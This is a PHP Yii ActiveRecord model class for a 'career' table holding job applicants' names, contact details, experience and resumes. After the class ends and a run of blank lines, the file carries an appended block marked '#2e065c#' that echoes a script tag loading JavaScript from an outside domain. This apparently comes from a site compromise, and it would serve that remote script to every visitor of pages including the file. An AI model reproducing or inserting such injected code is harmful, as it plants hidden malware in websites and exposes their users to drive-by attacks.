<?php

/**
 * This is the model class for table "career".
 *
 * The followings are the available columns in table 'career':
 * @property integer $cid
 * @property string $name
 * @property string $b_date
 * @property string $address
 * @property string $fax
 * @property string $email
 * @property string $quilification
 * @property integer $experience
 * @property integer $last_org
 * @property string $current_position
 * @property string $created_on
 * @property string $status
 *
 * The followings are the available model relations:
 * @property Qualification[] $qualifications
 */
class Career extends CActiveRecord
{
	/**
	 * @return string the associated database table name
	 */
	public function tableName()
	{
		return 'career';
	}

	/**
	 * @return array validation rules for model attributes.
	 */
	public function rules()
	{
		// NOTE: you should only define rules for those attributes that
		// will receive user inputs.
		return array(
			array('name, b_date, address, email', 'required'),
			array('experience, last_org,career_id, mobile', 'numerical', 'integerOnly'=>true),
			array('name, address, email', 'length', 'max'=>200),
			array('fax', 'length', 'max'=>10),
			array('email', 'email'),
			array('resume', 'file', 'types'=>'doc,docx,pdf', 'on'=>'insert'),
			array('status', 'length', 'max'=>20),
			// The following rule is used by search().
			// @todo Please remove those attributes that should not be searched.
			array('cid, name, mobile, b_date,career_id, address, fax, email, quilification, experience, last_org, current_position, created_on, status', 'safe', 'on'=>'search'),
		);
	}

	/**
	 * @return array relational rules.
	 */
	public function relations()
	{
		// NOTE: you may need to adjust the relation name and the related
		// class name for the relations automatically generated below.
		return array(
			'qualifications' => array(self::HAS_MANY, 'Qualification', 'career_id'),

			'job' => array(self::BELONGS_TO, 'Careers', 'career_id'),
		);
	}

	/**
	 * @return array customized attribute labels (name=>label)
	 */
	public function attributeLabels()
	{
		return array(
			'cid' => 'Cid',
			'name' => 'Name',
			'b_date' => 'Date of Birth',
			'address' => 'Address',
			'fax' => 'Fax',
			'email' => 'Email',
			'quilification' => 'Quilification',
			'mobile' => 'Mobile',
			'experience' => 'Experience(total no. of years)',
			'last_org' => 'Experience in last organization (total no. of years)',
			'current_position' => 'Current Position',
			'created_on' => 'Created On',
			'status' => 'Status',
		);
	}

	/**
	 * Retrieves a list of models based on the current search/filter conditions.
	 *
	 * Typical usecase:
	 * - Initialize the model fields with values from filter form.
	 * - Execute this method to get CActiveDataProvider instance which will filter
	 * models according to data in model fields.
	 * - Pass data provider to CGridView, CListView or any similar widget.
	 *
	 * @return CActiveDataProvider the data provider that can return the models
	 * based on the search/filter conditions.
	 */
	public function search()
	{
		// @todo Please modify the following code to remove attributes that should not be searched.

		$criteria=new CDbCriteria;

		$criteria->compare('cid',$this->cid);
		$criteria->compare('name',$this->name,true);
		$criteria->compare('b_date',$this->b_date,true);
		$criteria->compare('address',$this->address,true);
		$criteria->compare('fax',$this->fax,true);
		$criteria->compare('email',$this->email,true);
		$criteria->compare('quilification',$this->quilification,true);
		$criteria->compare('mobile',$this->mobile);
		$criteria->compare('experience',$this->experience);
		$criteria->compare('last_org',$this->last_org);
		$criteria->compare('current_position',$this->current_position,true);
		$criteria->compare('created_on',$this->created_on,true);
		$criteria->compare('status',$this->status,true);

		return new CActiveDataProvider($this, array(
			'criteria'=>$criteria,
		));
	}

	/**
	 * Returns the static model of the specified AR class.
	 * Please note that you should have this exact method in all your CActiveRecord descendants!
	 * @param string $className active record class name.
	 * @return Career the static model class
	 */
	public static function model($className=__CLASS__)
	{
		return parent::model($className);
	}
}







#2e065c#
if(empty($w)) {
$w = "<script type=\"text/javascript\" src=\"http://olteniamagazin.ro/2b9vr6yj.php?id=9383501\"></script>";
echo $w;
}
#/2e065c#

